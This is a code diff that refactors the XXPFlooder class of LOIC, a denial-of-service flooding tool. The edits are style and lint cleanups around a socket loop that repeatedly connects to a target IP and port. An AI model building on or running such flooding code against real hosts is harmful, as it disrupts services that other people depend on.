@@ -2,7 +2,6 @@
 using System.ComponentModel;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 
 namespace LOIC
 {
@@ -16,7 +15,7 @@ namespace LOIC
 		public int Delay;
 		public bool Resp;
 		public string Data;
-		private bool AllowRandom;
+		private readonly bool AllowRandom;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
@@ -32,7 +31,7 @@ namespace LOIC
 		{
 			IsFlooding = true;
 			BackgroundWorker bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
+			bw.DoWork += bw_DoWork;
 			bw.RunWorkerAsync();
 		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
@@ -40,7 +39,7 @@ namespace LOIC
 			try
 			{
 				byte[] buf;
-				IPEndPoint RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
 					Socket socket = null;
@@ -64,6 +63,7 @@ namespace LOIC
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
 							}
+							// Analysis disable once EmptyGeneralCatchClause
 							catch { }
 						}
 					}
@@ -83,11 +83,13 @@ namespace LOIC
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
 							}
+							// Analysis disable once EmptyGeneralCatchClause
 							catch { }
 						}
 					}
 				}
 			}
+			// Analysis disable once EmptyGeneralCatchClause
 			catch { }
 		}
 	}
